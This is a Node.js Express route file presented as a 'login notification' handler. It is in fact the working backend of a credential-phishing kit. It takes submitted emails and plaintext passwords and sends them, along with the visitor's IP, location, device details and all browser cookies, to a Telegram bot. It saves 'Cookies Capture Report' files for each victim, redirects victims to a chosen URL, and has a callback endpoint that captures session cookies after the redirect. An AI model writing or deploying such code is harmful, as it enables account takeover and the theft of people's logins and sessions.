// routes/login-notify.js
const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Telegram bot token or chat id missing in env; Telegram notifications disabled.');
}

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../cookies');

async function ensureCookiesDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
  }
}

async function createCookiesFile(email, ip, cookiesBefore, cookiesAfter = null, redirectUrl = null) {
  await ensureCookiesDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.txt`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  let fileContent = `Cookies Capture Report
====================
Email: ${email}
IP: ${ip}
Timestamp: ${new Date().toISOString()}
Redirect URL: ${redirectUrl || 'No redirect'}
File: ${filename}

INITIAL COOKIES (Before any action):
${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}

Total Initial Cookies: ${Object.keys(cookiesBefore).length}
`;

  if (cookiesAfter && Object.keys(cookiesAfter).length > 0) {
    fileContent += `

COOKIES AFTER REDIRECT/RESPONSE:
${Object.entries(cookiesAfter).map(([k, v]) => `${k}: ${v}`).join('\n')}

Total Cookies After: ${Object.keys(cookiesAfter).length}

NEW COOKIES DETECTED:
${Object.entries(cookiesAfter)
  .filter(([k, v]) => !cookiesBefore[k] || cookiesBefore[k] !== v)
  .map(([k, v]) => `${k}: ${v} (${cookiesBefore[k] ? 'modified' : 'new'})`)
  .join('\n')}
`;
  }

  await fs.writeFile(filepath, fileContent);
  return { filename, filepath };
}

// Option 1: Simple redirect that sets cookies
router.post('/', async (req, res) => {
  try {
    const { email, password, redirect_url } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Missing email or password" });
    }

    // Capture cookies BEFORE any action
    const cookiesBefore = { ...req.cookies };
    
    // IP + geo
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // UA parsing
    const parser = new UAParser(req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Create initial cookies file
    let fileInfo = null;
    try {
      fileInfo = await createCookiesFile(email, ip, cookiesBefore, null, redirect_url);
      console.log(`Initial cookies file created: ${fileInfo.filename}`);
    } catch (fileError) {
      console.error('Error creating cookies file:', fileError);
    }

    // Build message
    const cookieReport = Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)';

    // Build Telegram message
    const message = `📌 *Login Notification* 
- Email: \`${email}\` 
- Password: \`${password}\` 
- IP: \`${ip}\` 
- Location: ${locationStr} 
- Timestamp: ${new Date().toISOString()} 
- Device: ${deviceType} 
- Redirect URL: ${redirect_url || 'None'}
- Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
*Initial Cookies:* 
\`\`\`
${cookieReport}
\`\`\`
`;

    // Send to Telegram if configured
    if (TELEGRAM_API) {
      await fetch(TELEGRAM_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    // OPTION 1: Set some cookies and redirect
    if (redirect_url) {
      // Set some tracking cookies
      res.cookie('login_tracker', `track_${Date.now()}`, { 
        maxAge: 900000, // 15 minutes
        httpOnly: true 
      });
      res.cookie('user_session', `session_${email}_${Date.now()}`, {
        maxAge: 3600000, // 1 hour
        httpOnly: true
      });
      
      // Capture cookies that WILL BE SET
      const cookiesAfter = {
        ...cookiesBefore,
        login_tracker: `track_${Date.now()}`,
        user_session: `session_${email}_${Date.now()}`
      };
      
      // Update cookies file with post-redirect info
      try {
        await createCookiesFile(email, ip, cookiesBefore, cookiesAfter, redirect_url);
      } catch (error) {
        console.error('Error updating cookies file:', error);
      }
      
      return res.redirect(redirect_url);
    }

    // OPTION 2: Just respond with JSON (no redirect)
    return res.status(200).json({
      success: true,
      message: "Login processed",
      redirect: redirect_url || false,
      loginDetails: {
        device: deviceType,
        ip,
        location: locationStr,
        cookiesCount: Object.keys(cookiesBefore).length,
        cookiesFile: fileInfo?.filename
      }
    });

  } catch (error) {
    console.error("Error in /login-notify:", error);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// Option 2: Two-step process with redirect callback
router.post('/with-redirect', async (req, res) => {
  try {
    const { email, password, redirect_url } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Missing email or password" });
    }

    const cookiesBefore = { ...req.cookies };
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    // Store session data temporarily (in production use Redis or database)
    const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Create initial file
    const fileInfo = await createCookiesFile(email, ip, cookiesBefore, null, redirect_url);

    // Set session cookie for tracking
    res.cookie('redirect_tracker', sessionId, { maxAge: 300000 }); // 5 minutes
    
    // Store pre-redirect data (in production, use proper session storage)
    global.redirectSessions = global.redirectSessions || {};
    global.redirectSessions[sessionId] = {
      email,
      ip,
      cookiesBefore,
      fileInfo,
      timestamp: Date.now()
    };

    // Send Telegram notification
    if (TELEGRAM_API) {
      const message = `🔄 *Login with Redirect* 
- Email: \`${email}\`
- Session: \`${sessionId}\`
- Redirect: ${redirect_url}
- Initial Cookies: ${Object.keys(cookiesBefore).length}
      `;
      
      await fetch(TELEGRAM_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    // Perform redirect
    return res.redirect(redirect_url);

  } catch (error) {
    console.error("Error in redirect endpoint:", error);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// Callback endpoint after redirect
router.get('/redirect-callback', async (req, res) => {
  try {
    const { session_id } = req.query;
    const cookiesAfter = { ...req.cookies };
    
    if (!session_id || !global.redirectSessions?.[session_id]) {
      return res.status(400).json({ success: false, message: "Invalid session" });
    }

    const session = global.redirectSessions[session_id];
    
    // Update cookies file with post-redirect data
    await createCookiesFile(session.email, session.ip, session.cookiesBefore, cookiesAfter, 'Redirect completed');
    
    // Cleanup session
    delete global.redirectSessions[session_id];

    return res.json({
      success: true,
      message: "Redirect completed and cookies captured",
      cookiesBefore: session.cookiesBefore,
      cookiesAfter: cookiesAfter,
      newCookies: Object.keys(cookiesAfter).filter(k => !session.cookiesBefore[k])
    });

  } catch (error) {
    console.error("Error in redirect callback:", error);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
});

module.exports = router;